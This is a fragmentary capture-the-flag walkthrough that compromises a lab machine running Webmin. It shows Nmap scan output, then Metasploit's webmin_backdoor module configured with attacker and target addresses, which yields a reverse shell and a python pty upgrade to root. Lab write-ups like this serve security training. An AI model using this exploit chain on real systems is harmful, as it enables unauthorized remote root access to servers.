...
1.  Nmap scan:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-28 10:37 EDT
...
Completed Parallel DNS resolution of 1 host. at 10:37, 0.14s elapsed
Initiating Connect Scan at 10:37
Scanning 10.10.11.158 [1000 ports]
Discovered open port 22/tcp on 10.10.11.158
Discovered open port 10000/tcp on 10.10.11.158
Increasing send delay for 10.10.11.158 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.10.11.158 from 5 to 10 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.158 from 10 to 20 due to max_successful_tryno increase to 6
Completed Connect Scan at 10:38, 42.17s elapsed (1000 total ports)
Initiating Service scan at 10:38
Scanning 2 services on 10.10.11.158
Completed Service scan at 10:38, 6.62s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.158.
Initiating NSE at 10:38
Completed NSE at 10:38, 30.28s elapsed
Initiating NSE at 10:38
Completed NSE at 10:38, 1.25s elapsed
Initiating NSE at 10:38
...
|_http-favicon: Unknown favicon MD5: 09BE671BFE38784894463C187D27C690
| http-methods: 
...
Nmap done: 1 IP address (1 host up) scanned in 80.92 seconds
...
```bash
msf6 exploit(linux/http/webmin_backdoor) > help
...
4.  We would use the backdoor module:
```bash
msf6 > search exploit/linux/http/webmin_backdoor
...
msf6 exploit(linux/http/webmin_backdoor) > set LHOST=10.17.28.202
[-] Unknown datastore option: LHOST=10.17.28.202.
...
msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.17.28.202
LHOST => 10.17.28.202
msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.11.158
RHOSTS => 10.10.11.158
...
[*] Command shell session 1 opened (10.17.28.202:4444 -> 10.10.11.158:46728) at 2023-07-28 11:14:10 -0400

ls
```

6.  We got the shell. Now we want a prominent shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
root@source:/usr/share/webmin/# ls
```

7.  We got the root and the user flag...!